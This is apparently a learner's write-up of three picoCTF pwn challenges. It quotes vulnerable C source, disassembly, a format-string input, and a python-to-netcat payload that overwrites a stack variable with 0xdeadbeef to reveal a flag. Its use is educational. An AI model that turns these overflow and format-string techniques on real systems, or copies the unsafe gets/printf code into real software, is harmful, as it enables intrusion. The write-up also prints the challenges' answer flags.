# 1. buffer overflow 0
Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here.
Connect using:
nc saturn.picoctf.net 62023

## Solution:

1.I start with connecting to the given netcat conncetion.It asks for an input and then exits after getting an input.
```
nc saturn.picoctf.net 62023

Input: pico
The program will exit now
```
2.I take a look at the source code
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}

```
Upon reading the file I immediately notice SIGSEGV(is a signal sent to a program when it tries to access memory it's not allowed to).This code is basically saying, "If you are about to crash with a SIGSEGV, don't just crash. Instead, run the sigsegv_handler function first."This makes me analyze the sigsegv_handler fuction.

3.The sigsegv_handler function prints the flag.To achieve this I must cause a segmentation error.For this I notice a strcpy() function being used,where the variable we are copying to is only 16 bytes,so to cause a segmentaion error our input just has to be greater than 16 bytes.

4.I connect again to the nexcat connection and input more than 16  ccharacters.The flag is found.

## Flag:    

```
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```

## Concepts learnt:

-  Buffer Overflow: Understanding the fundamental concept that copying an input string of size n into a buffer of size m, where n > m, can overwrite adjacent memory.
- Signal Handling(SIGSEGV): Learning that the default behavior of a program crashing (Segmentation Fault) can be modified by the programmer using the signal() function.
- 

## Resources:

- GeeksforGeeks C Buffer Overflow(https://www.geeksforgeeks.org/cpp/buffer-overflow-attack-with-example/)
- C Signal Handling Basics(https://www.geeksforgeeks.org/c/signals-c-language/)
- Segmentation fault(https://en.wikipedia.org/wiki/Segmentation_fault)


***

# 2. format string0

Can you use your knowledge of format strings to make the customers happy?
Download the binary here.
Download the source here.
Connect with the challenge instance here:
nc mimas.picoctf.net 50118

## Solution:

1.Analyze the source code.
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 32
#define FLAGSIZE 64

char flag[FLAGSIZE];

void sigsegv_handler(int sig) {
    printf("\n%s\n", flag);
    fflush(stdout);
    exit(1);
}

int on_menu(char *burger, char *menu[], int count) {
    for (int i = 0; i < count; i++) {
        if (strcmp(burger, menu[i]) == 0)
            return 1;
    }
    return 0;
}

void serve_patrick();

void serve_bob();


int main(int argc, char **argv){
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                        "own debugging flag.\n");
        exit(0);
    }

    fgets(flag, FLAGSIZE, f);
    signal(SIGSEGV, sigsegv_handler);

    gid_t gid = getegid();
    setresgid(gid, gid, gid);

    serve_patrick();
  
    return 0;
}

void serve_patrick() {
    printf("%s %s\n%s\n%s %s\n%s",
            "Welcome to our newly-opened burger place Pico 'n Patty!",
            "Can you help the picky customers find their favorite burger?",
            "Here comes the first customer Patrick who wants a giant bite.",
            "Please choose from the following burgers:",
            "Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice1[BUFSIZE];
    scanf("%s", choice1);
    char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
    if (!on_menu(choice1, menu1, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        int count = printf(choice1);
        if (count > 2 * BUFSIZE) {
            serve_bob();
        } else {
            printf("%s\n%s\n",
                    "Patrick is still hungry!",
                    "Try to serve him something of larger size!");
            fflush(stdout);
        }
    }
}

void serve_bob() {
    printf("\n%s %s\n%s %s\n%s %s\n%s",
a            "Now can you serve the second customer?",
            "Sponge Bob wants something outrageous that would break the shop",
            "(better be served quick before the shop owner kicks you out!)",
            "Please choose from the following burgers:",
            "Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice2[BUFSIZE];
    scanf("%s", choice2);
    char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};
    if (!on_menu(choice2, menu2, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        printf(choice2);
        fflush(stdout);
    }
}

```
The goal is to trigger a Segmentation Fault SIGSEGV to execute the sigsegv_handler() function and print the flag. 

2.Triggering SIGSEGV under server_bob() will cause the flag to print,however,to reach serve_bob() we first have to bypass serve_patrick().Which only happens if the characters printed by printf(choice1) is greater than 2xBUFFERSIZE (i.e., 64 characters).We must choose an input that is greater than 64 characters.Our options are
```
Breakf@st_Burger (16 chars)
Bac0n_D3luxe (13 chars)
Gr%114d_Cheese(>114 chars)# due to padding provided by %114d

```
So to bypass serve_patrick() we input 'Gr%114d_Cheese'

3.To trigger SIGSEGV in serve_bob() ,the program is vulnerable at the line printf(choice2). The goal is to use a format specifier to access an invalid memory address.So we input the only option
that contains the needed format specifiers
```
Cla%sic_Che%s%steak
```

4.We connect to the netcat connection and input our options and the flag is displayed.
```
 nc mimas.picoctf.net 50118
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}
```


## Flag:

```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}
```

## Concepts learnt:

- Format String Vulnerability: Exploiting printf user input to execute unintended actions.
- Control total charectre count:Using width specifiers like %114d to control the total character count output by printf and bypass size based logical checks.
- Crashing with %s: Using the %s specifier to force printf to read a pointer from the stack and access the memory it points to. If this pointer is invalid, it results in a SIGSEGV.

## Resources:

- Format String Vulnerability and Prevention(https://www.geeksforgeeks.org/c/format-string-vulnerability-and-prevention-with-example/)  

***

# 3. clutter overflow

Clutter, clutter everywhere and not a byte to use.
nc mars.picoctf.net 31890

## Solution:
1. connect to netcat connection and trying test input returns
```
% nc mars.picoctf.net 31890
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""  
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
clutter
code == 0x0
code != 0xdeadbeef :(
```
upon reasearch 
2.Analysing the source code
```
#include <stdio.h>
#include <stdlib.h>

#define SIZE 0x100
#define GOAL 0xdeadbeef

const char* HEADER = 
" ______________________________________________________________________\n"
"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|\n"
"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |\n"
"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|\n"
"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \\^ ^ |\n"
"|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \\ ^ _ ^ / |                | \\^ ^|\n"
"| ^/_\\^ ^ ^ /_________\\^ ^ ^ /_\\ | //  | /_\\ ^| |   ____  ____   | | ^ |\n"
"|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|\n"
"| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |\n"
"|^ ^ ^ ^ ^| /     (   \\ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \\|^ ^|\n"
".-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |\n"
"|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\\ |^ ^|\n"
"| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |\n"
"|'.____'_^||/!\\@@@@@/!\\|| _'______________.'|==                    =====\n"
"|\\|______|===============|________________|/|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\" ||\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"  \n"
"\"\"''\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"";

int main(void)
{
  long code = 0;
  char clutter[SIZE];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);
 	
  puts(HEADER); 
  puts("My room is so cluttered...");
  puts("What do you see?");

  gets(clutter);


  if (code == GOAL) {
    printf("code == 0x%llx: how did that happen??\n", GOAL);
    puts("take a flag for your troubles");
    system("cat flag.txt");
  } else {
    printf("code == 0x%llx\n", code);
    printf("code != 0x%llx :(\n", GOAL);
  }

  return 0;
}

```
The program creates a small storage space (a buffer) called clutter that holds 256 bytes (0x100 size).It creates a nearby variable called code and sets its initial value to zero.It uses the function gets(clutter) to read your input.The Win Condition: It checks: if (code == GOAL). The value of GOAL is a secret hexadecimal number: 0xdeadbeef.If we can change the value of code from 0 to 0xdeadbeef, it prints the flag.

3.Debugging with gdb
```
gdb -q chall
Reading symbols from chall...
(No debugging symbols found in chall)
gef➤  disassemble main
   ...
   0x000000000040074c <+133>:   call   0x4005d0 <gets@plt>
   0x0000000000400751 <+138>:   mov    eax,0xdeadbeef
   0x0000000000400756 <+143>:   cmp    QWORD PTR [rbp-0x8],rax # We see that the local variable code is stored in $rbp - 0x8
   0x000000000040075a <+147>:   jne    0x40078c <main+197>
   ...
End of assembler dump.

```
4.We know we can overflow the buffer, but we need to know the exact number of bytes that separates the start of our input (clutter buffer) from the target variable (code). We use IDA to see the assembly code to understand the data locations.
```
var_110= byte ptr -110h
var_8= qword ptr -8

; __unwind {
push    rbp
mov     rbp, rsp
sub     rsp, 110h
mov     [rbp+var_8], 0
mov     rax, cs:stdout@@GLIBC_2_2_5
mov     esi, 0          ; buf
mov     rdi, rax        ; stream
call    _setbuf
mov     rax, cs:stdin@@GLIBC_2_2_5
mov     esi, 0          ; buf
mov     rdi, rax        ; stream
call    _setbuf
mov     rax, cs:stderr@@GLIBC_2_2_5
mov     esi, 0          ; buf
mov     rdi, rax        ; stream
call    _setbuf
mov     rax, cs:HEADER
mov     rdi, rax        ; s
call    _puts
lea     rdi, s          ; "My room is so cluttered..."
call    _puts
lea     rdi, aWhatDoYouSee ; "What do you see?"
call    _puts
lea     rax, [rbp+var_110]
mov     rdi, rax
mov     eax, 0
call    _gets
mov     eax, 0DEADBEEFh
cmp     [rbp+var_8], rax
jnz     short loc_40078C
```
We examine the memory addresses relative to the RBP register (the Base Pointer):
Buffer Start (clutter): The assembly shows the clutter buffer starts at RBP - 0x110( 0x110 is 272 bytes in decimal)
Target Variable (code): The assembly shows the code variable is located at RBP - 0x8( 0x8 is 8 bytes in decimal)
The Padding is the distance between the start of our input (clutter) and the start of our target (code).
Padding = (Distance to clutter) - (Distance to code) Padding = 0x110 - 0x8 Padding = 0x108 (0x108 in hexadecimal is exactly 264 bytes in decimal.)

5.I use the following command to send the payload
```
python3 -c 'import sys; sys.stdout.write("A" * 264)'; echo -e '\xef\xbe\xad\xde') | nc mars.picoctf.net 31890
```
Output
```
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```
## Flag:

```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

## Concepts learnt:

-In a 64-bit architecture (AMD64), local variables declared as long or pointers are typically 8 bytes wide (a Quadword or QWORD).
- When a program uses a standard input function like gets() or fgets(), it typically waits for a newline character (\n or0x0a) to terminate the input and start processing.


## Notes:

- Include any alternate tangents you went on while solving the challenge, including mistakes & other solutions you found.
- When a program uses a standard input function like gets() or fgets(), it typically waits for a newline character (\n, or $\text{0x0a}$) to terminate the input and start processing.

## Resources:

- Buffer Overflow(https://owasp.org/www-community/vulnerabilities/Buffer_Overflow)
- IDA(https://hex-rays.com/ida-free)
- What is Endianness? Big-Endian & Little-Endian(https://www.geeksforgeeks.org/dsa/little-and-big-endian-mystery/)
- pwntools(https://docs.pwntools.com/en/stable/)

***